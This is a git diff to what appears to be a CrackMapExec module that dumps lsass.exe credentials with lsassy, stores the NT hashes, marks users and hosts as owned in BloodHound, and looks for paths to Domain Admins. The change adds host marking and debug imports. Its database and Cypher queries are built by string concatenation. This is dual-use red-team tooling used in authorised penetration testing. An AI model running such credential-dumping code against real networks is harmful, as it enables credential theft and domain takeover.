@@ -3,6 +3,7 @@
 
 import configparser
 from ctypes import create_unicode_buffer
+from operator import mod
 from types import MethodType
 from neo4j import GraphDatabase, basic_auth
 from neo4j.exceptions import AuthError, ServiceUnavailable
@@ -15,6 +16,7 @@ from lsassy.dumper import Dumper
 from lsassy.parser import Parser
 from lsassy.session import Session
 from lsassy.impacketfile import ImpacketFile
+from icecream import ic
 
 config = configparser.ConfigParser()
 cme_path = os.path.expanduser('~/.cme')
@@ -82,13 +84,15 @@ def process_creds(context, connection, credentials_data):
         if nthash == 'aad3b435b51404eeaad3b435b51404ee' or nthash =='31d6cfe0d16ae931b73c59d7e0c089c0':
             context.log.error(f"Hash for {username} is expired.")
         elif username not in found_users:
-            context.log.success(f"Found hashes for: {username}:{nthash} on {connection.host}. Adding them to the DB and marking user as owned in BH.")
+            context.log.success(f"Found hashes for: {username}:{nthash} on {connection.hostname}. Adding them to the DB. Marking user and PC as owned in BH.")
             found_users.append(username)
             cursor.execute("UPDATE admin_users SET hash = ? WHERE username LIKE '" + username + "%'", [nthash])
             dbconnection.commit()
             username = (f"{username.upper()}@{connection.domain.upper()}")
+            hostname = (f"{connection.hostname.upper()}.{connection.domain.upper()}")
             session = driver.session()
             session.run('MATCH (u) WHERE (u.name = "' + username + '") SET u.owned=True RETURN u,u.name,u.owned')
+            session.run('MATCH (c) WHERE (c.name = "' + hostname + '") SET c.owned=True RETURN c,c.name,c.owned')
             path_to_da = session.run("MATCH p=shortestPath((n)-[*1..]->(m)) WHERE exists(n.owned) AND m.name=~ '.*DOMAIN ADMINS.*' RETURN p")
             paths = [record for record in path_to_da.data()]
             for path in paths:
@@ -106,11 +110,13 @@ class CMEModule:
 
     def options(self, context, module_options):
         """
+            unmark_dumped       Sets dumped to False to re-dump (default: False)
             METHOD              Method to use to dump lsass.exe with lsassy
         """
         self.method = 'comsvcs'
         if 'METHOD' in module_options:
             self.method = module_options['METHOD']
+        
     def run_lsassy(self, context, connection): # Couldn't figure out how to properly retrieve output from the module without editing. Blatantly ripped from lsassy_dump.py. Thanks pixis - @hackanddo!
         logger.init(quiet=True)
         host = connection.host
